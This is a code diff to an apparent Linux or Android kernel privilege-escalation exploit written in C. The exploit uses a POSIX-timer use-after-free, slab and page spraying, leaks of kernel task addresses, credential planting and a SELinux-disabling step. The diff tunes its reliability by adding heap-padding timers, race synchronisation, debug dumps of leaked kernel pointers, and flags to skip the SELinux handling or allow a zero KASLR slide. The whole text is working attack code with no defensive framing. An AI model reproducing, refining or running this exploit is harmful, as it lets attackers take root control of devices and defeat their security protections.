@@ -54,7 +54,12 @@ static unsigned g_task_cred = TASK_CRED_DEFAULT;
 static unsigned g_cred_size = 0xb8;
 static unsigned g_slab_objects = 21;
 static unsigned g_slab_pages = 2;
+static unsigned g_task_size = 5248;
 static const char *g_profile = "115";
+static int g_allow_zero_slide;
+static int g_skip_selinux;
+static int g_debug_task;
+static int g_padding_timers = 4096;
 
 static int set_kernel_profile(const char *profile)
 {
@@ -91,6 +96,7 @@ static uint64_t slide_addr(uint64_t link)
 }
 #define NFILL 42
 #define NFLUSH 2048
+#define MAX_PADDING_TIMERS 8192
 #define MAX_RINGS 9000
 #define MAX_PIPES 400
 #define NVMA 50000
@@ -110,12 +116,13 @@ static size_t g_vmalen;
 
 struct ipc {
 	atomic_int phase;
+	atomic_int exec_ready;
 	int helpers[4];
 	int nhelpers;
 };
 static struct ipc *ipc;
 
-static uint64_t g_all[2200];
+static uint64_t g_all[16384];
 static int g_all_n;
 static int g_pipes[MAX_PIPES][2];
 static int g_npipes;
@@ -208,7 +215,7 @@ static uint64_t object_pfn(uint64_t ptr)
 	return ((ptr & ~UINT64_C(0xfff)) - PAGE_OFFSET) >> 12;
 }
 
-static uint64_t g_watch[4500];
+static uint64_t g_watch[32768];
 static int g_nwatch;
 
 static int cmp_u64(const void *a, const void *b)
@@ -592,7 +599,8 @@ static int collect_nth(int index, int *count, uint64_t *chosen)
 	}
 	free(buf);
 	*count = n;
-	g_all_n = n;
+	g_all_n = n < (int)(sizeof(g_all) / sizeof(g_all[0]))
+		? n : (int)(sizeof(g_all) / sizeof(g_all[0]));
 	dprintf(STDOUT_FILENO, "[uaf] captured=%d chosen=%#" PRIx64 " raw=%zu\n",
 		n, *chosen, used);
 	return (n > index && *chosen) ? 0 : -1;
@@ -708,6 +716,11 @@ static int killer_fn(void *arg)
 			return 0;
 		sched_yield();
 	}
+	while (!atomic_load_explicit(&ipc->exec_ready, memory_order_acquire)) {
+		if (atomic_load_explicit(&g_stop, memory_order_acquire))
+			return 0;
+		sched_yield();
+	}
 	for (;;) {
 		if (syscall(SYS_tgkill, tgid, old, 0) < 0 && errno == ESRCH)
 			break;
@@ -743,7 +756,17 @@ static void *exec_fn(void *arg)
 		sched_yield();
 	}
 	timer_t armed;
+	timer_t *padding = NULL;
 	int made = 0;
+	if (g_padding_timers > 0) {
+		padding = calloc((size_t)g_padding_timers, sizeof(*padding));
+		if (!padding)
+			_exit(121);
+		for (int i = 0; i < g_padding_timers; i++) {
+			if (timer_create(CLOCK_THREAD_CPUTIME_ID, &event, &padding[i]))
+				_exit(121);
+		}
+	}
 	for (int i = 0; i < 2048; i++) {
 		timer_t extra;
 		if (timer_create(CLOCK_THREAD_CPUTIME_ID,
@@ -756,6 +779,9 @@ static void *exec_fn(void *arg)
 		}
 		made++;
 	}
+	for (int i = 0; i < g_padding_timers; i++)
+		timer_delete(padding[i]);
+	free(padding);
 	if (made < 2048)
 		_exit(120);
 	atomic_store_explicit(&g_exec_tid, (int)syscall(SYS_gettid), memory_order_release);
@@ -767,6 +793,11 @@ static void *exec_fn(void *arg)
 	}
 	atomic_store_explicit(&g_go, 1, memory_order_release);
 	while (atomic_load_explicit(&g_in_mprotect, memory_order_acquire) == 0) {
+		if (atomic_load_explicit(&g_stop, memory_order_acquire))
+			_exit(123);
+		sched_yield();
+	}
+	while (!atomic_load_explicit(&ipc->exec_ready, memory_order_acquire)) {
 		if (atomic_load_explicit(&g_stop, memory_order_acquire))
 			_exit(123);
 		sched_yield();
@@ -830,6 +861,25 @@ static void stop_helpers(void)
 	}
 }
 
+/* A page miss leaves the timer node in a parked zombie.  The helper clones
+ * can be reaped, but the victim itself must remain unreaped.  Keeping those
+ * two cases separate lets the caller start a fresh victim without taking the
+ * next process group's cred-helper down with it. */
+static void reap_helpers_only(void)
+{
+	if (!ipc)
+		return;
+	for (int i = 0; i < ipc->nhelpers && i < 4; i++) {
+		pid_t helper = ipc->helpers[i];
+		if (helper > 0) {
+			int st;
+			kill(helper, SIGKILL);
+			while (waitpid(helper, &st, 0) < 0 && errno == EINTR) {}
+		}
+	}
+	ipc->nhelpers = 0;
+}
+
 static void cleanup_uaf_group(pid_t child, int *status_out)
 {
 	int status = 0;
@@ -838,7 +888,6 @@ static void cleanup_uaf_group(pid_t child, int *status_out)
 		return;
 	helpers = ipc->nhelpers;
 	if (child > 0) {
-		(void)kill(-child, SIGKILL);
 		(void)kill(child, SIGKILL);
 	}
 	stop_helpers();
@@ -1383,6 +1432,11 @@ static int reclaim_stream(uint64_t victim, uint64_t target)
 		close_stream();
 		return -1;
 	}
+	if (g_debug_task) {
+		dprintf(STDOUT_FILENO, "[streamdbg] trace armed pfn=%#" PRIx64 "\n", base);
+		fflush(stdout);
+	}
+	atomic_store_explicit(&ipc->exec_ready, 1, memory_order_release);
 	clock_gettime(CLOCK_MONOTONIC, &wait_start);
 	{
 		struct timespec pause = { .tv_nsec = 25000000 };
@@ -1398,6 +1452,25 @@ static int reclaim_stream(uint64_t victim, uint64_t target)
 		dprintf(STDOUT_FILENO,
 			"[stream] page_freed=%d cpu=%d wait_ms=%ld\n",
 			free_cpu >= 0, free_cpu, wait_ms);
+		if (g_debug_task && free_cpu < 0) {
+			FILE *tf = fopen(TRACE "/trace", "r");
+			char line[512];
+			int shown = 0, nfree = 0;
+			if (tf) {
+				while (fgets(line, sizeof(line), tf)) {
+					if (strstr(line, "mm_page_free:")) {
+						nfree++;
+						if (shown < 4) {
+							dprintf(STDOUT_FILENO, "[streamdbg] %s", line);
+							shown++;
+						}
+					}
+				}
+				fclose(tf);
+			}
+			dprintf(STDOUT_FILENO, "[streamdbg] mm_page_free_lines=%d\n", nfree);
+			fflush(stdout);
+		}
 	}
 	clock_gettime(CLOCK_MONOTONIC, &start);
 	int spray_cpu = free_cpu >= 0 && free_cpu < ncpu ? free_cpu : 0;
@@ -1539,6 +1612,8 @@ static int one_uaf(uint64_t target)
 	atomic_store_explicit(&g_stop, 0, memory_order_relaxed);
 	atomic_store_explicit(&g_lockers, 0, memory_order_relaxed);
 	atomic_store_explicit(&g_exec_tid, 0, memory_order_relaxed);
+	if (ipc)
+		atomic_store_explicit(&ipc->exec_ready, 0, memory_order_relaxed);
 	atomic_store_explicit(&ipc->phase, 0, memory_order_relaxed);
 	child = fork();
 	if (child < 0)
@@ -1576,11 +1651,12 @@ static int one_uaf(uint64_t target)
 		return UAF_SAFE_RETRY;
 	}
 	write_file(TRACE "/tracing_on", "0\n");
-	if (collect_nth(1024, &nptr, &victim)) {
+	int victim_index = 1024 + g_padding_timers;
+	if (collect_nth(victim_index, &nptr, &victim)) {
 		cleanup_uaf_group(child, &status);
 		return UAF_SAFE_RETRY;
 	}
-	if (nptr < 1500) {
+	if (nptr < 1500 + g_padding_timers) {
 		dprintf(STDOUT_FILENO, "[uaf] too few timers\n");
 		cleanup_uaf_group(child, &status);
 		return UAF_SAFE_RETRY;
@@ -1596,9 +1672,10 @@ static int one_uaf(uint64_t target)
 	if (g_plant_cred)
 		g_cred_kva = victim + g_kitimer_node;
 	if (reclaim_stream(victim, target)) {
-		dprintf(STDOUT_FILENO, "[uaf] page miss; parking unsafe process\n");
+		dprintf(STDOUT_FILENO, "[uaf] page miss, retry\n");
 		stop_helpers();
-		return UAF_POISONED;
+		reap_helpers_only();
+		return UAF_SAFE_RETRY;
 	}
 	close_socks();
 	code = wait_zombie(child, &status);
@@ -1759,10 +1836,31 @@ static int leak_task(void)
 				break;
 		}
 		close(fd);
+		if (g_debug_task) {
+			dprintf(STDOUT_FILENO, "[taskdbg] cpu%d used=%zu\n", cpu, used);
+			int shown = 0;
+			for (size_t i = 0; i + 48 <= used && shown < 24; i += 8) {
+				uint64_t w0, w1, w2, w3, w4, w5;
+				memcpy(&w0, buf + i, 8);
+				memcpy(&w1, buf + i + 8, 8);
+				memcpy(&w2, buf + i + 16, 8);
+				memcpy(&w3, buf + i + 24, 8);
+				memcpy(&w4, buf + i + 32, 8);
+				memcpy(&w5, buf + i + 40, 8);
+				if ((w0 >> 48) != 0xffff || (w1 >> 48) != 0xffff)
+					continue;
+				dprintf(STDOUT_FILENO,
+					"[taskdbg] cpu%d off=%zu %#lx %#lx %#lx %#lx %#lx %#lx\n",
+					cpu, i, (unsigned long)w0, (unsigned long)w1,
+					(unsigned long)w2, (unsigned long)w3,
+					(unsigned long)w4, (unsigned long)w5);
+				shown++;
+			}
+		}
 		for (size_t i = 0; i + 32 <= used; i++) {
 			uint64_t site, ptr, req;
 			memcpy(&req, buf + i + 24, 8);
-			if (req != 5248)
+		if (req != g_task_size)
 				continue;
 			memcpy(&site, buf + i, 8);
 			memcpy(&ptr, buf + i + 8, 8);
@@ -1870,6 +1968,19 @@ int main(int argc, char **argv)
 		} else if (!strcmp(argv[i], "--slab-pages") && i + 1 < argc) {
 			g_slab_pages = (unsigned)strtoul(argv[++i], NULL, 0);
 			g_profile = "custom";
+		} else if (!strcmp(argv[i], "--task-size") && i + 1 < argc) {
+			g_task_size = (unsigned)strtoul(argv[++i], NULL, 0);
+			g_profile = "custom";
+		} else if (!strcmp(argv[i], "--allow-zero-slide")) {
+			g_allow_zero_slide = 1;
+		} else if (!strcmp(argv[i], "--skip-selinux")) {
+			g_skip_selinux = 1;
+		} else if (!strcmp(argv[i], "--debug-task")) {
+			g_debug_task = 1;
+		} else if (!strcmp(argv[i], "--padding-timers") && i + 1 < argc) {
+			g_padding_timers = atoi(argv[++i]);
+			if (g_padding_timers < 0 || g_padding_timers > MAX_PADDING_TIMERS)
+				return 2;
 		} else if (!strcmp(argv[i], "--selinux-link") && i + 1 < argc) {
 			g_selinux_link = strtoull(argv[++i], NULL, 0);
 			g_profile = "custom";
@@ -1898,7 +2009,7 @@ int main(int argc, char **argv)
 	sigaction(SIGALRM, &action, NULL);
 	if (preflight)
 		return preflight_probe();
-	if (!g_slide) {
+	if (!g_slide && !g_allow_zero_slide) {
 		dprintf(STDOUT_FILENO, "[slide] missing --slide\n");
 		return 2;
 	}
@@ -1928,7 +2039,7 @@ int main(int argc, char **argv)
 		return 5;
 	}
 	g_plant_cred = 0;
-	{
+	if (!g_skip_selinux && access("/sys/fs/selinux/enforce", F_OK) == 0) {
 		uint64_t sel = slide_addr(g_selinux_link) - 7;
 		for (int i = 1; i <= 4; i++) {
 			char buf[8] = { 0 };
